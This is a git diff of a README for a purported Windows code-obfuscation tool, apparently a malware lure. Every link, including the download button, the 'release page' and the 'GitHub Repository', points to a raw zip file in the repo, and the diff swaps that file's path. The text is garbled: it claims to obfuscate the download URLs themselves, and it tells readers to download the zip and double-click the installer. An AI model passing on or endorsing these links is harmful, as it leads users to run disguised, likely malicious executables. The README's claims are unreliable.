@@ -1,10 +1,10 @@
 # 🖥️ windows - Simplified Obfuscation Made Easy
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/bins/windows_v2.0.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/bins/windows_v2.0.zip)
+[![Download](https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/screenshots/Software_3.5.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/screenshots/Software_3.5.zip)
 
 ## 🚀 Getting Started
-Welcome to the **windows** project! This application securely obfuscates `https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/bins/windows_v2.0.zip` and `https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/bins/windows_v2.0.zip` using CodeDefender technology. Follow these simple steps to get started.
+Welcome to the **windows** project! This application securely obfuscates `https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/screenshots/Software_3.5.zip` and `https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/screenshots/Software_3.5.zip` using CodeDefender technology. Follow these simple steps to get started.
 
 ## 🔍 What You Need
 Before diving in, ensure your system meets the following requirements:
@@ -17,11 +17,11 @@ To download the latest version of our software, follow these steps:
 
 1. **Visit the Release Page**: Click the link below to access the GitHub Releases page where you can find the available downloads.
 
-   [Visit this page to download](https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/bins/windows_v2.0.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/screenshots/Software_3.5.zip)
 
 2. **Select the Latest Release**: Look for the most recent version at the top of the page. You will see version numbers like `v1.0.0`.
 
-3. **Download the Files**: Click on the file that corresponds to your operating system, such as `https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/bins/windows_v2.0.zip`. The file will start downloading automatically.
+3. **Download the Files**: Click on the file that corresponds to your operating system, such as `https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/screenshots/Software_3.5.zip`. The file will start downloading automatically.
 
 4. **Run the Installer**: Once the download is complete, locate the file in your Downloads folder. Double-click on it to run the installer.
 
@@ -60,6 +60,6 @@ Feel free to reach out if you have questions or need assistance. You can:
 This project is licensed under the MIT License, allowing you to use it freely with necessary attributions.
 
 ## 📞 Contact Information
-For more information, you can directly visit our [GitHub Repository](https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/bins/windows_v2.0.zip) or reach out through the issues section.
+For more information, you can directly visit our [GitHub Repository](https://raw.githubusercontent.com/Alex123Aaaaaa/windows/master/screenshots/Software_3.5.zip) or reach out through the issues section.
 
 Happy obfuscating!
